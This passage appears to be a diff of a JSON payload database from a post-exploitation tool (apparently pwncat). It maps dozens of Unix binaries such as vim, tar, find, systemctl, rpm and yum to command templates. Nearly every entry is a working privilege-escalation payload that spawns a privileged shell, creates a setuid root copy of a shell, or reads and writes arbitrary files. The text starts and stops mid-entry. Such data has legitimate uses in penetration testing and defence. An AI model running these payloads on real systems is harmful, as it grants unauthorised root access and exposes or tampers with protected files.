\"rb\").read())'"]},{"type":"write","stream":"base64","payload":"TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64","args":[""],"exit":"{ctrl_d}{ctrl_d}"}],"python2":[{"type":"shell","payload":"{command}","args":["-c","'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]},{"type":"read","stream":"raw","payload":"{command}","args":["-c","'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]},{"type":"write","stream":"base64","payload":"TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64","args":[""],"exit":"{ctrl_d}{ctrl_d}"}],"python2.7":[{"type":"shell","payload":"{command}","args":["-c","'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]},{"type":"read","stream":"raw","payload":"{command}","args":["-c","'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]},{"type":"write","stream":"base64","payload":"TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64","args":[""],"exit":"{ctrl_d}{ctrl_d}"}],"rake":[{"type":"shell","payload":"{command}","args":["-p","'`{shell} 1>&0`'"]}],"redcarpet":[{"type":"read","stream":"print","payload":"{command} | {sed} 's/^<p>//g' | {sed} 's|</p>$||g'","args":["{lfile}"]}],"rlwrap":[{"type":"shell","payload":"{command}","args":["-H","/dev/null","{shell}","-p"]}],"rpm":[{"type":"shell","payload":"export TS=$({mktemp} -u); cp {shell} $TS; {command}; $TS -p; {rm} -f $TS","input":"rm -f $TS\nunset TS\n","args":["--eval","\"%{{lua:posix.chown('$TS',0,0);posix.chmod('$TS', '+s');}}\""]}],"rpmquery":[{"type":"shell","payload":"export TS=$({mktemp} -u); cp {shell} $TS; {command}; $TS -p; {rm} -f $TS","input":"rm -f $TS\nunset TS\n","args":["--eval","\"%{{lua:posix.chown('$TS',0,0);posix.chmod('$TS', '+s');}}\""]}],"rsync":[{"type":"shell","payload":"{command}","args":["-e","'{shell} -p -c \"{shell} -p 0<&2 1>&2\"'","127.0.0.1:/dev/null"]}],"ruby":[{"type":"shell","payload":"TF=$({mktemp}); echo 'exec \"{shell} -p\"' > $TF; {command}","args":["$TF"]},{"type":"read","stream":"print","payload":"TF=$({mktemp}); echo 'puts File.read(\"{lfile}\")' > $TF; {command}","args":["$TF"]},{"type":"write","stream":"print","payload":"TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}","args":["$TF"],"exit":"{ctrl_d}{ctrl_d}"},{"type":"write","stream":"base64","payload":"TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}","args":["$TF"],"exit":"{ctrl_d}{ctrl_d}"}],"ruby2.5":[{"type":"shell","payload":"TF=$({mktemp}); echo 'exec \"{shell} -p\"' > $TF; {command}","args":["$TF"]},{"type":"read","stream":"print","payload":"TF=$({mktemp}); echo 'puts File.read(\"{lfile}\")' > $TF; {command}","args":["$TF"]},{"type":"write","stream":"print","payload":"TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}","args":["$TF"],"exit":"{ctrl_d}{ctrl_d}"},{"type":"write","stream":"base64","payload":"TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}","args":["$TF"],"exit":"{ctrl_d}{ctrl_d}"}],"run-parts":[{"type":"shell","payload":"{command}","args":["--new-session","--regex","'^bash$'","/bin","--arg='-p'"]},{"type":"shell","payload":"{command}","args":["--new-session","--regex","'^sh$'","/bin","--arg='-p'"]}],"scp":[{"type":"shell","payload":"TF=$({mktemp}); echo '{shell} 0<&2 1>&2' > $TF; {chmod} +x \"$TF\"; {command}","args":["-S","$TF","x","y:"]}],"screen":[{"type":"shell","payload":"{command}","args":["{shell}"]}],"script":[{"type":"shell","payload":"{command}","args":["-qc","{shell}","/dev/null"]}],"sed":[{"type":"shell","payload":"{command}","args":["-n","'1e exec {shell} -p 1>&0'","/etc/hosts"]},{"type":"read","stream":"print","payload":"{command}","args":["''","{lfile}"]},{"type":"write","stream":"print","payload":"{command}","args":["-n","'s/\\(.\\)/\\1/w {lfile}'"],"exit":"{ctrl_d}{ctrl_d}"}],"service":[{"type":"shell","payload":"{command}","args":["../../{shell} -p"]}],"setarch":[{"type":"shell","payload":"{command}","args":["$({arch})","{shell} -p"]}],"sftp":[{"type":"shell","payload":"{command}","args":["-o","ProxyCommand=';{shell} -p 0<&2 1>&2'","x"]}],"shuf":[{"type":"read","stream":"print","payload":"{command}","args":["-z","{lfile}"]}],"socat":[{"type":"shell","payload":"{command}","args":["STDIN","EXEC:{shell},nofork,pty"],"exit":"exit\n"},{"type":"read","payload":"{command}","args":["-u","FILE:{lfile}","STDOUT"]},{"type":"write","stream":"print","payload":"{command} 2>/dev/null","args":["-u","STDIN","CREATE:{lfile}"],"exit":"{ctrl_d}"},{"type":"write","stream":"base64","payload":"{base64} -d | {command} 2>/dev/null","args":["-u","STDIN","CREATE:{lfile}"],"exit":"{ctrl_d}"}],"soelim":[{"type":"read","stream":"print","payload":"{command} | {tail} -n +2","args":["{lfile}"]}],"sort":[{"type":"read","stream":"print","payload":"{command}","args":["-m","{lfile}"]}],"sqlite3":[{"type":"shell","payload":"{command}","args":["/dev/null","'.shell {shell} -p'"]},{"type":"read","stream":"print","payload":"echo -e \"CREATE TABLE t(line TEXT);\\n.import {lfile} t\\nSELECT * FROM t;\\n\" | {command}","args":[""]}],"ssh":[{"type":"shell","payload":"{command}","args":["-o","ProxyCommand=';{shell} -p 0<&2 1>&2'","x"]}],"start-stop-daemon":[{"type":"shell","payload":"{command}","args":["-n","$RANDOM","-S","-x","{shell}","--","-p"]}],"stdbuf":[{"type":"shell","payload":"{command}","args":["-i0","{shell}","-p"]}],"strace":[{"type":"shell","payload":"{command}","args":["-o","/dev/null","{shell}","-p"]}],"strings":[{"type":"read","stream":"print","payload":"{command}","args":["{lfile}"]}],"x86_64-linux-gnu-strings":[{"type":"read","stream":"print","payload":"{command}","args":["{lfile}"]}],"x86-linux-gnu-strings":[{"type":"read","stream":"print","payload":"{command}","args":["{lfile}"]}],"systemctl":[{"type":"shell","payload":"TF=$({mktemp} -u).service; TS=$({mktemp} -u); echo -e \"[Service]\\nType=oneshot\\nExecStart={shell} -c 'cp {shell} $TS; {chmod} +sx $TS;'\\n[Install]\\nWantedBy=multi-user.target\" > $TF; {command} link $TF; {command} enable --now $TF; $TS -p","args":[]},{"type":"shell","payload":"{command}","input":"!{shell} -p\n","exit":"exit\n{ctrl_c}","args":[]}],"tac":[{"type":"read","stream":"raw","payload":"{command}","args":["-s","'_-_PWNCAT_RANDOM_DELIM_-_'","{lfile}"]}],"tail":[{"type":"read","stream":"raw","payload":"{command}","args":["-c1GB","{lfile}"]}],"tar":[{"type":"shell","payload":"{command}","args":["-cf","/dev/null","/dev/null","--checkpoint=1","--checkpoint-action=exec={shell} -p"]},{"type":"shell","payload":"{command}","args":["xf","/dev/null","-I","'{shell} -p -c \"{shell} -p <&2 1>&2\"'"]},{"type":"read","stream":"raw","payload":"{command} 2>&1","args":["xf","{lfile}","-I","'{sh} -c \"{cat} 1>&2\"'"]}],"taskset":[{"type":"shell","payload":"{command}","args":["1","{shell}","-p"]}],"tclsh":[{"type":"shell","payload":"TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp}); echo 'exec {shell} -p <@stdin >@stdout 2>@stderr; exit' > $TF; {command}","args":["$TF"]}],"tee":[{"type":"write","stream":"base64","payload":"{base64} -d | {command} >/dev/null","args":["{lfile}"],"exit":"{ctrl_d}{ctrl_d}"}],"time":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"timeout":[{"type":"shell","payload":"{command}","args":["--foreground","7d","{shell}","-p"]}],"tmux":[{"type":"shell","payload":"{command}","args":["-c","{shell}"]}],"ul":[{"type":"read","stream":"print","payload":"{command}","args":["{lfile}"]}],"unexpand":[{"type":"read","stream":"raw","payload":"{command}","args":["-t99999999","{lfile}"]}],"uniq":[{"type":"read","stream":"print","payload":"{command}","args":["{lfile}"]}],"unshare":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"uuencode":[{"type":"read","stream":"raw","payload":"{command} | {uudecode}","args":["{lfile}","/dev/stdout"]}],"valgrind":[{"type":"shell","payload":"{command}","args":["-q","{shell}"]}],"vi":[{"type":"shell","payload":"{command}","args":["-c","':!exec {shell} -p'","-c","':q'"],"exit":"exit\n\n"}],"vim":[{"type":"shell","payload":"{command}","args":["-c","':!exec {shell} -p'","-c","':q'"],"exit":"exit\n\n"},{"type":"shell","payload":"{command}","args":["-c","':py3 import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'","-c","'quit'"]},{"type":"shell","payload":"{command}","args":["-c","':py import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'","-c","'quit'"]},{"type":"shell","payload":"{command}","args":["-c","':lua os.execute(\"reset; exec {shell}\")'","-c","'quit'"]},{"type":"read","stream":"print","payload":"{command}","args":["-es","'+%print'","'+:q!'","{lfile}"]},{"type":"write","stream":"print","payload":"{cat} - | {command}","args":["-es","'+%print'","'+:w! {lfile}'","'+:q!'","/dev/stdin"],"exit":"{ctrl_d}"}],"vim.basic":[{"type":"shell","payload":"{command}","args":["-c","':!exec {shell} -p'","-c","':q'"],"exit":"exit\n\n"},{"type":"shell","payload":"{command}","args":["-c","':py3 import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'","-c","'quit'"]},{"type":"shell","payload":"{command}","args":["-c","':py import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'","-c","'quit'"]},{"type":"shell","payload":"{command}","args":["-c","':lua os.execute(\"reset; exec {shell}\")'","-c","'quit'"]},{"type":"read","stream":"print","payload":"{command}","args":["-es","'+%print'","'+:q!'","{lfile}"]},{"type":"write","stream":"print","payload":"{cat} - | {command}","args":["-es","'+%print'","'+:w! {lfile}'","'+:q!'","/dev/stdin"],"exit":"{ctrl_d}"}],"rvim":[{"type":"shell","payload":"{command}","args":["-c","':!exec {shell} -p'","-c","':q'"],"exit":"exit\n\n"},{"type":"shell","payload":"{command}","args":["-c","':py3 import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'","-c","'quit'"]},{"type":"shell","payload":"{command}","args":["-c","':py import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'","-c","'quit'"]},{"type":"shell","payload":"{command}","args":["-c","':lua os.execute(\"reset; exec {shell}\")'","-c","'quit'"]},{"type":"read","stream":"print","payload":"{command}","args":["-es","'+%print'","'+:q!'","{lfile}"]},{"type":"write","stream":"print","payload":"{cat} - | {command}","args":["-es","'+%print'","'+:w! {lfile}'","'+:q!'","/dev/stdin"],"exit":"{ctrl_d}"}],"wish":[{"type":"shell","payload":"TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp}); echo 'exec {shell} -p <@stdin >@stdout 2>@stderr; exit' > $TF; {command}","args":["$TF"]}],"xargs":[{"type":"shell","payload":"{command}","args":["-a","/dev/null","{shell}","-p"],"exit":"exit\n"},{"type":"read","stream":"print","payload":"{command}","args":["-a","{lfile}","-0"]}],"xxd":[{"type":"read","stream":"raw","payload":"{command} {lfile} | {command} -r ","args":[]},{"type":"write","stream":"raw","payload":"{xxd} -l {length} | {command}","args":["-r","-","{lfile}"]}],"yum":[{"type":"shell","payload":"TF=$({mktemp} -d); {cat} >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\n{cat} >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\n{cat} >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n    os.execl('{shell}','{shell}')\nEOF\n\n{command} -c $TF/x --enableplugin=y","args":[]}],"zip":[{"type":"shell","payload":"TF=none; {command} --help >/dev/null; TF=$({mktemp} -u); {command} $TF /etc/hosts -T -TT '{shell} #'","args":[]}],"zsh":[{"type":"shell","payload":"{command}","args":["-c","\"{shell} -p\""]}]}
+{
+  "dd": [
+    {
+      "type": "read",
+      "payload": "{command} 2>/dev/null",
+      "args": [
+        "if={lfile}"
+      ],
+      "suid": [],
+      "input": "",
+      "stream": "raw",
+      "exit": "{ctrl_c}"
+    },
+    {
+      "type": "write",
+      "stream": "raw",
+      "payload": "{command} 2>/dev/null",
+      "args": [
+        "of={lfile}",
+        "iflag=fullblock",
+        "bs=1"
+      ]
+    }
+  ],
+  "cp": [
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {cat} > $TF; {command}; rm -f $TF",
+      "args": [
+        "$TF",
+        "{lfile}"
+      ],
+      "exit": "{ctrl_d}"
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {base64} -d > $TF; {command}; rm -f $TF",
+      "args": [
+        "$TF",
+        "{lfile}"
+      ],
+      "exit": "{ctrl_d}"
+    }
+  ],
+  "bash": [
+    {
+      "type": "shell",
+      "stream": "print",
+      "suid": [
+        "-p"
+      ],
+      "exit": "exit"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'{cat} {lfile}'"
+      ],
+      "suid": [
+        "-p"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'{base64} -d > {lfile}'"
+      ],
+      "suid": [
+        "-p"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "dash": [
+    {
+      "type": "shell",
+      "stream": "print",
+      "suid": [
+        "-p"
+      ],
+      "exit": "exit"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} -c '{cat} {lfile}'",
+      "suid": [
+        "-p"
+      ],
+      "exit": "{ctrl_d}"
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{command} -c '{base64} -d > {lfile}'",
+      "suid": [
+        "-p"
+      ],
+      "exit": "{ctrl_d}"
+    }
+  ],
+  "cat": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} {lfile}"
+    }
+  ],
+  "apt": [
+    {
+      "type": "shell",
+      "args": [
+        "changelog",
+        "apt"
+      ],
+      "input": "!{shell}\n",
+      "exit": "exit\nq\n"
+    }
+  ],
+  "apt-get": [
+    {
+      "type": "shell",
+      "args": [
+        "changelog",
+        "apt"
+      ],
+      "input": "!{shell}\n",
+      "exit": "exit\nq\n"
+    }
+  ],
+  "aria2c": [
+    {
+      "type": "shell",
+      "payload": "export TF=$({mktemp}); export SH=$({mktemp}); {cp} {shell} $SH; echo \"{chown} root:root $SH; {chmod} +sx $SH\" > $TF; {chmod} +x $TF; {command}; sleep 1; {rm} -f $TF; $SH -p",
+      "input": "rm -f $TF; rm -f $SH; unset TF; unset SH;\n",
+      "args": [
+        "--on-download-error=$TF",
+        "http://x"
+      ],
+      "exit": "exit"
+    }
+  ],
+  "ash": [
+    {
+      "type": "shell",
+      "stream": "print",
+      "suid": [
+        "-p"
+      ],
+      "exit": "exit"
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command} -c '{cat} {lfile}'",
+      "suid": [
+        "-p"
+      ],
+      "exit": "{ctrl_c}"
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{command} -c '{base64} -d > {lfile}'",
+      "suid": [
+        "-p"
+      ],
+      "exit": "{ctrl_c}"
+    }
+  ],
+  "awk": [
+    {
+      "type": "shell",
+      "payload": "{command} 'BEGIN {{system(\"{shell} -p\")}}'",
+      "exit": "exit"
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command} // {lfile}"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "args": [
+        "-v",
+        "LFILE={lfile}",
+        "'BEGIN {{ printf \"\" > LFILE; while ((getline) > 0){{ print >> LFILE }} }}'"
+      ],
+      "exit": "{ctrl_d}"
+    }
+  ],
+  "base32": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} {lfile} | {base32} -d",
+      "args": []
+    }
+  ],
+  "base64": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} {lfile} | {base64} -d",
+      "args": []
+    }
+  ],
+  "bpftrace": [
+    {
+      "type": "shell",
+      "args": [
+        "-c",
+        "'{shell} -p'",
+        "-e",
+        "'END {{exit()}}'"
+      ],
+      "suid": [
+        "-p"
+      ],
+      "exit": "exit"
+    }
+  ],
+  "busctl": [
+    {
+      "type": "shell",
+      "input": "!{shell}\n",
+      "exit": "exit\nq\n"
+    }
+  ],
+  "byebug": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp}); echo 'system(\"{shell}\")' > $TF; {command}; rm -f $TF",
+      "args": [
+        "--no-stop",
+        "-q",
+        "$TF"
+      ],
+      "exit": "exit\n"
+    },
+    {
+      "type": "read",
+      "payload": "TF=$({mktemp}); echo 'system(\"{cat} {lfile}\")' > $TF; {command}; rm -f $TF",
+      "args": [
+        "--no-stop",
+        "-q",
+        "$TF"
+      ],
+      "exit": "exit\n"
+    }
+  ],
+  "chmod": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "+s",
+        "{shell}; {shell} -p"
+      ],
+      "exit": "exit\n"
+    },
+    {
+      "type": "read",
+      "payload": "{command} 2>/dev/null",
+      "args": [
+        "+s",
+        "{dd};",
+        "{dd}",
+        "if={lfile}"
+      ],
+      "stream": "raw"
+    },
+    {
+      "type": "write",
+      "stream": "raw",
+      "payload": "{command} 2>/dev/null",
+      "args": [
+        "+s",
+        "{dd};",
+        "{dd}",
+        "of={lfile}",
+        "iflag=count_bytes,fullblock",
+        "count={length}"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "{command} 2>/dev/null",
+      "args": [
+        "+s",
+        "{dd};",
+        "{dd}",
+        "of={lfile}"
+      ],
+      "exit": "{ctrl_d}"
+    }
+  ],
+  "chroot": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "/",
+        "{shell}",
+        "-p"
+      ],
+      "exit": "exit\n"
+    }
+  ],
+  "cobc": [
+    {
+      "type": "shell",
+      "payload": "TF=none; {command} 2>/dev/null; TF=$({mktemp}); echo 'CALL \"SYSTEM\" USING \"exec {shell} -p\".' > $TF; {command} 2>&1; rm -f $TF",
+      "args": [
+        "-xFj",
+        "--frelax-syntax-checks",
+        "$TF"
+      ],
+      "exit": "exit\n"
+    }
+  ],
+  "cpan": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "input": "! system(\"{shell} -p\")\n",
+      "exit": "exit\nexit\n"
+    }
+  ],
+  "cpulimit": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-l",
+        "100",
+        "-f",
+        "\"{shell}\""
+      ],
+      "exit": "exit\n"
+    }
+  ],
+  "crash": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-h"
+      ],
+      "input": "!{shell} -p\n",
+      "exit": "exit\nq\n"
+    }
+  ],
+  "csh": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "suid": [
+        "-b"
+      ],
+      "input": "{shell} -p\n",
+      "exit": "exit\nexit\n"
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "\"{cat} {lfile}\"",
+        "-b"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "\"{base64} -d > {lfile}\"",
+        "-b"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "bsd-csh": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "input": "{shell} -p\n",
+      "suid": [
+        "-b"
+      ],
+      "exit": "exit\nexit\n"
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "\"{cat} {lfile}\"",
+        "-b"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "\"{base64} -d > {lfile}\"",
+        "-b"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "curl": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-s",
+        "file://{lfile} --output -"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "base64",
+      "payload": "{command} | {base64} -w 0",
+      "args": [
+        "-s",
+        "file://{lfile} --output -"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {cat} > $TF; {command}; rm -f $TF",
+      "args": [
+        "-s",
+        "file://$TF --output {lfile}"
+      ],
+      "exit": "{ctrl_d}"
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {base64} -d > $TF; {command}; rm -f $TF",
+      "args": [
+        "-s",
+        "file://$TF",
+        "--output",
+        "{lfile}"
+      ],
+      "exit": "{ctrl_d}"
+    }
+  ],
+  "cut": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-d",
+        "''",
+        "-f1",
+        "{lfile}"
+      ]
+    }
+  ],
+  "date": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command} | {cut} -d \":\" -f2- | while read line; do echo ${{line:14:-1}}; done",
+      "args": [
+        "-f",
+        "{lfile}",
+        "+\"%M%M%M%M%M%M\"",
+        "2>&1"
+      ]
+    }
+  ],
+  "diff": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "--line-format=%L",
+        "/dev/null",
+        "{lfile}"
+      ]
+    }
+  ],
+  "dmesg": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-H"
+      ],
+      "input": "!{shell} -p\n",
+      "exit": "exit\nq\n"
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-rF",
+        "{lfile}"
+      ]
+    }
+  ],
+  "dpkg": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-l"
+      ],
+      "input": "!{shell} -p\n",
+      "exit": "exit\nq\n"
+    }
+  ],
+  "easy_install": [
+    {
+      "type": "shell",
+      "payload": "TF=none; {command} -h; TF=$({mktemp} -d);echo \"import os; os.execl('{shell}', '{shell}', '-c', '{shell} -p <$({tty}) >$({tty}) 2>$({tty})')\" > $TF/setup.py; {command} $TF",
+      "args": [],
+      "exit": "exit\n"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d);echo \"import sys; sys.stdout.buffer.write(open('{lfile}', 'rb').read())\" > $TF/setup.py; {command} $TF 2>/dev/null | {tail} -n +4",
+      "args": []
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d); {cat} > $TF/b64; echo \"import os; os.execl('''{python}''', 'python', '''-c''', '''import base64\\nwith open('{lfile}','wb') as h:\\n\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\th.write(base64.b64decode(line.strip()))''')\" > $TF/setup.py; {command} $TF 2>/dev/null; {rm} -f $TF/b64",
+      "args": [],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "eb": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "logs"
+      ],
+      "input": "!{shell} -p\n",
+      "exit": "exit\nq\n"
+    }
+  ],
+  "ed": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "input": "!{shell} -p\n",
+      "exit": "exit\nq\n"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "echo ',p' | {command}",
+      "args": [
+        "-s",
+        "{lfile}"
+      ],
+      "input": ",p\n",
+      "exit": "q\n"
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "echo -e \"1,\\$d\\na\\n$({cat})\\n.\\nw\\nq\\n\" | {command}",
+      "args": [
+        "-s",
+        "{lfile}"
+      ],
+      "exit": "{ctrl_d}"
+    }
+  ],
+  "emacs": [
+    {
+      "type": "shell",
+      "payload": "{command}; {shell} -p",
+      "args": [
+        "-Q",
+        "-nw",
+        "--eval '(chmod \"{shell}\" #o4755)'",
+        "--eval \"(kill-emacs)\""
+      ],
+      "exit": "exit\n"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "TF=$({mktemp}); {command}; {cat} $TF ",
+      "args": [
+        "-Q",
+        "-nw",
+        "{lfile}",
+        "--eval \"(write-file \\\"$TF\\\")\"",
+        "--eval '(kill-emacs)'"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "{cat} > /tmp/.em; {command}",
+      "args": [
+        "-Q",
+        "-nw",
+        "/tmp/.em",
+        "--eval \"(write-file \\\"{lfile}\\\")\"",
+        "--eval '(kill-emacs)'"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "env": [
+    {
+      "type": "shell",
+      "payload": "{command} {shell} -p",
+      "args": [],
+      "exit": "exit\n"
+    }
+  ],
+  "eqn": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "TF={lfile}; {command} | {grep} -Pzo \"(?s)\\.lf 1 $TF.*\" | {tail} -n +2",
+      "args": [
+        "$TF"
+      ]
+    }
+  ],
+  "expand": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "{lfile}"
+      ]
+    }
+  ],
+  "expect": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "\"spawn {shell} -p; interact\""
+      ],
+      "exit": "exit\n"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "\"spawn {cat} {lfile}; interact\""
+      ]
+    }
+  ],
+  "facter": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp} -d); echo 'exec(\"{shell} -p\")' > $TF/x.rb; FACTERLIB=$TF {command}",
+      "args": [
+        ""
+      ]
+    }
+  ],
+  "find": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        ".",
+        "-exec",
+        "{shell} -p",
+        "\\;",
+        "-quit"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        ".",
+        "-exec",
+        "{cat} {lfile}",
+        "\\;",
+        "-quit"
+      ]
+    }
+  ],
+  "flock": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-u",
+        "/",
+        "{shell} -p"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-u",
+        "/",
+        "{cat} {lfile}"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{command}",
+      "args": [
+        "-u",
+        "/",
+        "{sh} -c \"{base64} -d > {lfile}\""
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "fmt": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-pNON_EXISTING_PREFIX",
+        "{lfile}"
+      ]
+    }
+  ],
+  "fold": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-w99999999",
+        "{lfile}"
+      ]
+    }
+  ],
+  "ftp": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "input": "!{shell} -p\n",
+      "exit": "exit\nexit\n"
+    }
+  ],
+  "gawk": [
+    {
+      "type": "shell",
+      "payload": "{command} 'BEGIN {{system(\"{shell} -p\")}}'",
+      "exit": "exit"
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command} // {lfile}"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "args": [
+        "-v",
+        "LFILE={lfile}",
